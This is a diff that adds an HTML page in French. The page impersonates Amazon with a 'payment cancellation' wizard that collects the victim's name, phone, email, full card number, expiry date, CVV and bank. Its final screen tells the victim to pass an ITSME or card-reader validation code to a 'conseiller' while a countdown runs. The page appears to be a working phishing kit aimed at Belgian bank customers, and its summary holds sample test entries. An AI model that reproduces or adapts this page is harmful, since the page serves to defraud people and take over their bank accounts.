@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Annulation de paiement</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+
+    <!-- Wizard Form -->
+    <div id="wizard" class="wizard-container active">
+        
+        <!-- Navbar with Amazon Logo -->
+        <nav class="navbar">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
+        </nav>
+
+        <!-- Top Progress Bar -->
+        <div class="stepper">
+            <div class="step active" id="stepper-1">
+                <div class="step-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                </div>
+                <div class="step-label">Informations Client</div>
+            </div>
+            <div class="step-line" id="line-1"></div>
+            
+            <div class="step" id="stepper-2">
+                <div class="step-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                </div>
+                <div class="step-label">Coordonnées Bancaires</div>
+            </div>
+            <div class="step-line" id="line-2"></div>
+            
+            <div class="step" id="stepper-3">
+                <div class="step-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+                </div>
+                <div class="step-label">Récapitulatif</div>
+            </div>
+            <div class="step-line" id="line-3"></div>
+            
+            <div class="step" id="stepper-4">
+                <div class="step-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                </div>
+                <div class="step-label">Confirmation</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            
+            <!-- STEP 1: Informations Client -->
+            <div id="step-1" class="form-card active">
+                <h2>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="title-icon"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    Annulation de paiement
+                </h2>
+                <p class="subtitle">Afin de procéder à l'annulation de votre commande et au remboursement, merci de compléter le formulaire ci-dessous avec vos informations.</p>
+                
+                <h3 class="section-title">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    Informations client
+                </h3>
+                
+                <div class="form-grid">
+                    <div class="input-group">
+                        <label>Nom</label>
+                        <input type="text" id="client-nom" placeholder="Votre nom" required>
+                    </div>
+                    <div class="input-group">
+                        <label>Prénom</label>
+                        <input type="text" id="client-prenom" placeholder="Votre prénom" required>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label>Numéro de téléphone</label>
+                    <input type="tel" id="client-tel" placeholder="+32 4 12 34 56 78" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Adresse e-mail</label>
+                    <input type="email" id="client-email" placeholder="votre.email@exemple.com" required>
+                </div>
+                
+                <div class="actions right">
+                    <button type="button" id="btn-next-1" class="btn-primary">Continuer <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></button>
+                </div>
+            </div>
+
+            <!-- STEP 2: Coordonnées Bancaires -->
+            <div id="step-2" class="form-card">
+                <h2>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="title-icon"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                    Coordonnées bancaires
+                </h2>
+                <p class="subtitle">Veuillez renseigner vos coordonnées bancaires. Une carte virtuelle s'affichera automatiquement et se remplira en temps réel lors de la saisie de vos informations.</p>
+                
+                <div class="bank-layout">
+                    <div class="card-column">
+                        <div class="virtual-card">
+                            <div class="card-top">
+                                <div class="chip-container">
+                                    <div class="orange-chip"></div>
+                                    <div class="stacked-icon">
+                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 12 12 17 22 12"></polyline><polyline points="2 17 12 22 22 17"></polyline></svg>
+                                    </div>
+                                </div>
+                                <div class="bank-logo">
+                                    <div class="blue-box"></div>
+                                    <div class="yellow-box"></div>
+                                </div>
+                            </div>
+                            <div class="card-number-label">NUMÉRO DE CARTE</div>
+                            <div class="card-number" id="vc-number">•••• •••• •••• ••••</div>
+                            <div class="card-bottom">
+                                <div class="card-holder">
+                                    <div class="label">BANQUE</div>
+                                    <div class="value" id="vc-name">VOTRE BANQUE</div>
+                                </div>
+                                <div class="card-exp">
+                                    <div class="label">EXPIRE</div>
+                                    <div class="value" id="vc-exp">MM/YY</div>
+                                </div>
+                                <div class="mastercard-logo">
+                                    <div class="circle red"></div>
+                                    <div class="circle orange"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-column">
+                        <div class="input-group">
+                            <label>Numéro de carte</label>
+                            <input type="text" id="bank-card" placeholder="4455 4678 6654 1385" maxlength="19" required>
+                        </div>
+                        <div class="form-grid">
+                            <div class="input-group">
+                                <label>Date d'expiration</label>
+                                <input type="text" id="bank-exp" placeholder="05/22" maxlength="5" required>
+                            </div>
+                            <div class="input-group">
+                                <label>CVV</label>
+                                <input type="password" id="bank-cvv" placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label>Banque</label>
+                            <input type="text" id="bank-name" placeholder="Nom de votre banque" required>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="actions space-between">
+                    <button id="btn-prev-2" class="btn-secondary"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg> Retour</button>
+                    <button id="btn-next-2" class="btn-primary">Continuer <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></button>
+                </div>
+            </div>
+
+            <!-- STEP 3: Récapitulatif -->
+            <div id="step-3" class="form-card">
+                <h2>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="title-icon"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+                    Récapitulatif de votre demande
+                </h2>
+                <p class="subtitle">Veuillez vérifier attentivement vos informations avant de confirmer votre demande d'annulation.</p>
+                
+                <div class="summary-box">
+                    <h3 class="section-title">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                        Informations Client
+                    </h3>
+                    <div class="summary-grid">
+                        <div class="summary-item">
+                            <span class="label">Nom</span>
+                            <span class="value" id="sum-nom">test</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Prénom</span>
+                            <span class="value" id="sum-prenom">tets</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Téléphone</span>
+                            <span class="value" id="sum-tel">+325464564464</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Email</span>
+                            <span class="value" id="sum-email">ddieu@gmail.com</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="summary-box mt-4">
+                    <h3 class="section-title">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                        Coordonnées Bancaires
+                    </h3>
+                    <div class="summary-grid">
+                        <div class="summary-item">
+                            <span class="label">Numéro de carte</span>
+                            <span class="value" id="sum-card">4484 •••• •••• 1622</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Date d'expiration</span>
+                            <span class="value" id="sum-exp">04/56</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">CVV</span>
+                            <span class="value">•••</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Banque</span>
+                            <span class="value" id="sum-bank">crelan</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="actions space-between mt-6">
+                    <button id="btn-prev-3" class="btn-secondary"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg> Retour</button>
+                    <button id="btn-submit" class="btn-primary"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> Confirmer l'annulation</button>
+                </div>
+            </div>
+
+            <!-- STEP 5: Confirmation Screen -->
+            <div id="step-5" class="form-card" style="text-align: center; padding: 3rem 2rem;">
+                <div class="success-icon">
+                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                </div>
+                <h2>Demande envoyée avec succès</h2>
+                <p>Votre demande d'annulation a été enregistrée. Vous recevrez une confirmation par email sous peu.</p>
+                
+                <div style="margin-top: 2rem; font-size: 0.9rem; line-height: 1.6; color: var(--text-primary);">
+                    <p style="color: var(--accent-orange); font-weight: 600; text-decoration: underline; margin-bottom: 1rem; text-transform: uppercase;">CONDITIONS GÉNÉRALES</p>
+                    <p style="font-weight: 600; margin-bottom: 1.5rem;">Afin de valider l'annulation, une confirmation avec un conseiller est requise.</p>
+                    <p style="margin-bottom: 1.5rem; color: var(--text-secondary);">En confirmant votre compte bancaire, vous autorisez l'envoi d'un SMS ou d'une validation via votre banque. Si l'application <span style="color: var(--accent-orange); font-weight: 600;">ITSME</span> est activée, la validation se fera via celle-ci. Sinon, un code sera généré sur votre <span style="color: var(--accent-orange); font-weight: 600;">lecteur de carte</span> et devra être communiqué au conseiller pour finaliser la procédure.</p>
+                    <p style="margin-bottom: 2rem; color: var(--text-secondary);">Cette étape permet de vérifier que les informations vous appartiennent et que vous êtes bien un utilisateur réel.</p>
+                    <p style="color: var(--accent-orange); font-weight: 700; font-size: 1rem;">Référence : 587-001</p>
+                </div>
+
+                <div class="countdown-container mt-6">
+                    <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 0.5rem;">Cette page expirera dans :</p>
+                    <div id="countdown-timer" style="font-size: 2rem; font-weight: 700; color: var(--accent-orange); font-family: monospace;">10:00</div>
+                </div>
+
+                <p style="margin-top: 3rem; font-size: 0.75rem; color: #6b7280;">© Connexion chiffrée et sécurisée SSL/TLS (RGPD)</p>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- STEP 4: Loading Screen (Full page overlay) -->
+    <div id="step-loading" class="loading-container">
+        <div class="spinner-circle"></div>
+        <h2>Annulation en cours</h2>
+        <p>Veuillez patienter pendant le traitement de votre demande...</p>
+        <div class="progress-bar-container">
+            <div class="progress-bar-fill" id="loading-progress"></div>
+        </div>
+        <div class="progress-text" id="loading-text">0%</div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
